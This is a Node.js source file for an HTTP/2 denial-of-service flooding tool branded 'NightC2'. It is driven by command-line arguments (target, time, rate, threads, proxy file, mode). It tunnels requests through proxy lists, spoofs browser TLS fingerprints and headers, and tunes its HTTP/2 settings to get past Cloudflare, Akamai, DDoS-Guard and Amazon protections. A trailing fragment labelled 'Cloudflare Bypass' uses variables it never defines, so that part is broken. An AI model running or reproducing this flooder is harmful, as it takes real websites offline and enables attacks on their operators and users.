// Code By @glockingdown nightc2 on top!
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const scp = require("set-cookie-parser");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
var colors = require("colors");
const util = require('util');
const v8 = require("v8");


const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;



const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function getRandomTLSCiphersuite() {
  const tlsCiphersuites = [
    'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256',
  ];

  const randomCiphersuite = tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];

  return randomCiphersuite;
}




const randomTLSCiphersuite = getRandomTLSCiphersuite();

const lookupPromise = util.promisify(dns.lookup);

let isp;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP', url + ':', isp);
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  ],

  cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ]
  const language_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'tt-RU,tt;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
  ];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];

process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
]
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_NO_TICKET |
crypto.constants.SSL_OP_NO_COMPRESSION |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_TLSEXT_PADDING |
crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt flood/bypass`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
     input: process.argv[7],
     ipversion: process.argv[8],
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);







const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;
colors.enable();
const coloredString = "Recommended big proxyfile if hard target.\n >  Only support HTTP/2.\n >  Use low thread(s) if you don't want crash your server.".white;
if (cluster.isMaster) {
    console.clear()
    console.log(`[!] Flood By NightC2 Glock`.red);
    console.log(`$Credits$: @glockingdown`.gray);
    console.log(`--------------------------------------------`.gray);
    console.log("[>] Heap Size:".green, (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toString().yellow);
    console.log('[>] Target: '.yellow + process.argv[2].cyan);
    console.log('[>] Time: '.magenta + process.argv[3].cyan);
    console.log('[>] Rate: '.blue + process.argv[4].cyan);
    console.log('[>] Thread(s): '.red + process.argv[5].cyan);
    console.log(`[>] ProxyFile: ${args.proxyFile.cyan} | Total: ${proxies.length.toString().cyan}`);
    console.log('[>] Mode: '.green + process.argv[7].cyan);
    console.log("[>] Note: ".brightCyan + coloredString);
    console.log(`--------------------------------------------`.gray);
    getIPAndISP(targetURL);


    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads*10; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


     const uaa = [
        '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
        '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
        '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
        '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
        '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
        '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
       ]
function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }
 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    let interval
    	if (args.input === 'flood') {
	  interval = 700;
	} 
  else if (args.input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  

	  interval = randomDelay(700, 7000);
	} else {
	  process.stdout.write('default : flood\r');
	  interval = 1000;
	}
  
  const type = [
    "text/plain"
    , "text/html"
    , "application/json"
    , "application/xml"
    , "multipart/form-data"
    , "application/octet-stream"
    , "image/jpeg"
    , "image/png"
    , "audio/mpeg"
    , "video/mp4"
    , "application/javascript"
    , "application/pdf"
    , "application/vnd.ms-excel"
    , "application/vnd.ms-powerpoint"
    , "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    , "application/vnd.openxmlformats-officedocument.presentationml.presentation"
    , "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    , "application/zip"
    , "image/gif"
    , "image/bmp"
    , "image/tiff"
    , "audio/wav"
    , "audio/midi"
    , "video/avi"
    , "video/mpeg"
    , "video/quicktime"
    , "text/csv"
    , "text/xml"
    , "text/css"
    , "text/javascript"
    , "application/graphql"
    , "application/x-www-form-urlencoded"
    , "application/vnd.api+json"
    , "application/ld+json"
    , "application/x-pkcs12"
    , "application/x-pkcs7-certificates"
    , "application/x-pkcs7-certreqresp"
    , "application/x-pem-file"
    , "application/x-x509-ca-cert"
    , "application/x-x509-user-cert"
    , "application/x-x509-server-cert"
    , "application/x-bzip"
    , "application/x-gzip"
    , "application/x-7z-compressed"
    , "application/x-rar-compressed"
    , "application/x-shockwave-flash"
  ];
  encoding_header = [
    'gzip, deflate, br'
    , 'compress, gzip'
    , 'deflate, gzip'
    , 'gzip, identity'
  ];
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera"];
    
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const generateUserAgent = (browser) => {
    const versions = {
        chrome: { min: 105, max: 124 },
        safari: { min: 10, max: 16 },
        brave: { min: 105, max: 124 },
        firefox: { min: 89, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 60, max: 90 },
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;

    const userAgentMap = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
        mobile: `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
    };

    return userAgentMap[browser];
};
const ua = generateUserAgent(getRandomBrowser())
  function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}


 
     const rateHeaders = [
        //{ "dnt": "1"  },
        { "te" : "trailers"},
        { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
        { "origin": "https://" + parsedTarget.host  },
        { "referer": "https://" + parsedTarget.host + "/"},
        //{ "content-type": 'application/x-www-form-urlencoded'},
        { "source-ip": randstr(5)  },
        //{ "viewport-width": "1920"  },
        //{ "cookie": cookieString(scp.parse(response["set-cookie"]))
        {"cache-control" : cache_header[Math.floor(Math.random() * cache_header.length)]},
        {"Origin-Request" : "/" + generateRandomString(3,6)},
        //{ "device-memory": "0.25"  },
        //{"viewport-height" : "1080"},
        { "Expect-CT": "99-OK" },
        { "data-return" : "false"},
        ];
        const rateHeaders2 = [
        { "dnt": "1"  },
        { "accept-charset": "UTF-8" },
        {"cache-control" : cache_header[Math.floor(Math.random() * cache_header.length)]},
        { "origin": "https://" + parsedTarget.host  },
        { "referer": "https://" + parsedTarget.host + "/" },
        {"Origin-Request" : "/" + generateRandomString(3,6)},
        {"accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
        //{ "content-type": 'application/x-www-form-urlencoded'},
        //{ "cookie": cookieString(scp.parse(response["set-cookie"]))
        //{ "viewport-width": "1920"  },
        //{"viewport-height" : "1080"},
        //{ "device-memory": "0.25"  },
        { "data-return" : "false"},
        ];
        const rateHeaders3 = [
      {"Early-Data" : 1},
      {"Accept-CH" : "RTT"},
      //{"Max-Forwards" : "5"},
      {"RTT" : 1},
      {"Vary" : randstr(5)},
      {"Via" : randstr(5)},
      {"Supports-Loading-Mode" : "credentialed-prerender"},
      //{"Service-Worker-Navigation-Preload" : "true"},
];
const platformd = [
  "Linux", 
 "Windows",
 "Mac OS",
 ];
let headers = {
  ":authority": parsedTarget.host,
  ":method": "GET",
  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
  "Accept" : accept_header[Math.floor(Math.random() * accept_header.length)],
  ":path": parsedTarget.path,
  ":scheme": "https",
  "sec-ch-ua-platform" : platformd[Math.floor(Math.random() * platformd.length)],
  "content-type" : type[Math.floor(Math.random() * type.length)],
  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
  "sec-ch-ua" : uaa,
  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
  "user-agent" :  ua,
  "Sec-CH-UA-Bitness" : "64",
}

 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     ":authority": parsedTarget.host,
     "x-forwarded-for" : parsedProxy[0],
     "x-forwarded-proto" : "https",
     timeout: 15
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)

    const settings = {
       enablePush: false,
       initialWindowSize: 15564991,
   };

 
    const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: [
           "h2", 'http/1.1', "spdy/3.1"
       ],
       ciphers: ciphers,
       sigalgs: sigalgs,
       requestCert: true,
       socket: connection,
       ecdhCurve: ecdhCurve,
       honorCipherOrder: false,
       followAllRedirects: true,
       rejectUnauthorized: false,
       secureOptions: secureOptions,
       secureContext :secureContext,
       host : parsedTarget.host,
       servername: parsedTarget.host,
       secureProtocol: secureProtocol
   };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      settings: {
        initialWindowSize: 15564991,
        maxFrameSize : 236619,
    },
    createConnection: () => tlsConn,
    socket: connection,
});

client.settings({
  initialWindowSize: 15564991,
  maxFrameSize : 236619,
});

const streams = []
		client.on('stream', (stream, headers) => {
		if (isp === 'Akamai Technologies, Inc.' ) {
			stream.priority = Math.random() < 0.5 ? 0 : 1; 
			stream.connection.localSettings[http2.constants.SETTINGS_HEADER_TABLE_SIZE(0x01)] = 4096;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] =16384;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_HEADER_LIST_SIZE(0x06)] = 32768;
			
		} else if (isp === 'Cloudflare, Inc.') {
			stream.priority = Math.random() < 0.5 ? 0 : 1;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x04)] = Math.random() < 0.5 ? 16777215 : 16384;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x05)] = Math.random() < 0.5 ? 65536 :65535;
			
			
		} else if (isp === 'Ddos-guard LTD') {
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 8;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16777215;
			
			
		} else if (isp === 'Amazon.com, Inc.') {
			stream.priority = Math.random() < 0.5 ? 0 : 1; 
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
		} else {
		    stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
		    stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
		}
    streams.push(stream);
	})

client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
           for (let i = 0; i < args.Rate; i++) {
            const dynHeaders = {                 
              ...headers,    
              ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
              ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],    
              ...rateHeaders3[Math.floor(Math.random()*rateHeaders3.length)],
              
            }
               const request = client.request(dynHeaders)
               .on("response", response => {
                   request.close();
                   request.destroy();
                  return
               });
               request.end(); 

           }
       }, interval);
      return;
    });
    client.on("close", () => {
        client.destroy();
        connection.destroy();
        return
    });
client.on("timeout", () => {
	client.destroy();
	connection.destroy();
	return
	});
  client.on("error", (error) => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSIONaaaaaa') {
      console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
      shouldPauseRequests = false;
      setTimeout(() => {
         
          shouldPauseRequests = false;
      },2000);
  } else if (error.code === 'ECONNRESETaa') {
      
      shouldPauseRequests = false;
      setTimeout(() => {
          
          shouldPauseRequests = false;
      }, 5000);
  }  else { const statusCode = error.response ? error.response.statusCode : null;
    if (statusCode >= 520 && statusCode <= 529) {
      
      shouldPauseRequests = false;
      setTimeout(() => {
         // console.log('Resuming requests after a short delay\r');
          shouldPauseRequests = false;
      }, 2000);
  } else if (statusCode >= 531 && statusCode <= 539) {
      
      setTimeout(() => {
         // console.log('Resuming requests after a short delay\r');
          shouldPauseRequests = false;
      }, 2000);
  } else {

  }

  }
    client.destroy();
    connection.destroy();
    return
});
});
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});


// Enhanced Settings for Cloudflare Bypass with HTTP/2 Optimizations and Concurrency

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/81.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"
];

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Dynamic Headers
function createHeaders() {
    return {
        ":method": "GET",
        ":path": url.parse(targetUrl).pathname,
        ":scheme": url.parse(targetUrl).protocol.replace(":", ""),
        ":authority": url.parse(targetUrl).hostname,
        "user-agent": getRandomUserAgent(),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.5",
    };
}

// HTTP/2 Client Configuration with Randomized Settings
const clientOptions = {
    settings: {
        maxConcurrentStreams: 100 + Math.floor(Math.random() * 50),
        maxFrameSize: 16384 + Math.floor(Math.random() * 32768),
        initialWindowSize: 65535 + Math.floor(Math.random() * 1024),
        headerTableSize: 4096 + Math.floor(Math.random() * 2048),
    },
    createConnection: () => tls.connect({
        ALPNProtocols: ["h2"],
        servername: url.parse(targetUrl).hostname,
        rejectUnauthorized: false,
        secureProtocol: "TLSv1_3_method",
        ciphers: crypto.constants.defaultCoreCipherList,
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
    })
};

// Initiating Requests with Enhanced Headers and Concurrency
function initiateRequest() {
    const client = http2.connect(targetUrl, clientOptions);
    client.on("error", (error) => {
        console.error("Connection error:", error.message);
    });

    const headers = createHeaders();
    for (let i = 0; i < concurrency; i++) {
        const req = client.request(headers);
        
        req.on("response", (headers, flags) => {
            req.setEncoding("utf8");
            req.on("data", (chunk) => {});
            req.on("end", () => {
                req.close();
            });
        });
        
        req.end();
    }
}
